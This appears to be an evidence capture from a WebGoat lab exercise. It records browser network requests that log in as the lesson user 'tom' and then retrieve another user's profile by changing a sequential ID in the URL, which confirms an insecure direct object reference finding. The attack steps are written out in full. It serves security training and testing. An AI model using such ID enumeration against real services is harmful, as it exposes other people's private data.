@@ -1,0 +1,57 @@
+Source: Chrome DevTools Network panel transcript (browser session, lesson-scoped login as "tom"/"cat" per IDOR lesson step 1)
+Captured: 2026-11-16T01:31:08Z
+
+=== Step 1: Lesson-internal login (POST /WebGoat/IDOR/login) ===
+Request Headers:
+  referer: http://10.242.10.31:8007/WebGoat/start.mvc
+  x-requested-with: XMLHttpRequest
+  content-type: application/x-www-form-urlencoded; charset=UTF-8
+  cookie: JSESSIONID=D1CD0E45FEC6AD10A560D0BE074337EF
+  origin: http://10.242.10.31:8007
+Request Body:
+  username=tom&password=cat
+Response Body:
+  {
+    "assignment" : "IDORLogin",
+    "attemptWasMade" : true,
+    "feedback" : "You are now logged in as tom. Please proceed.",
+    "lessonCompleted" : true
+  }
+
+=== Step 2: Own profile (GET /WebGoat/IDOR/profile) ===
+Request Headers:
+  x-requested-with: XMLHttpRequest
+  cookie: JSESSIONID=D1CD0E45FEC6AD10A560D0BE074337EF
+Response Body:
+  {
+    "role" : 3,
+    "color" : "yellow",
+    "size" : "small",
+    "name" : "Tom Cat",
+    "userId" : "2342384"
+  }
+
+=== Step 3: Cross-user profile via sequential ID (GET /WebGoat/IDOR/profile/2342388) — CONFIRMS F-02 ===
+Request: GET http://10.242.10.31:8007/WebGoat/IDOR/profile/2342388 HTTP/1.1
+Request Headers:
+  user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
+  referer: http://10.242.10.31:8007/WebGoat/start.mvc
+  x-requested-with: XMLHttpRequest
+  cookie: JSESSIONID=D1CD0E45FEC6AD10A560D0BE074337EF
+  host: 10.242.10.31:8007
+Response: HTTP/1.1 200
+Response Headers:
+  content-type: application/json
+  content-length: 293
+Response Body:
+  {
+    "assignment" : "IDORViewOtherProfile",
+    "attemptWasMade" : true,
+    "feedback" : "Well done, you found someone else's profile",
+    "lessonCompleted" : true,
+    "output" : "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}"
+  }
+
+Analysis: The session authenticated as "tom" (userId 2342384) was able to retrieve the full
+profile record of userId 2342388 ("Buffalo Bill") via GET /WebGoat/IDOR/profile/{id} with no
+ownership/ACL check performed server-side — confirmed IDOR (F-02).
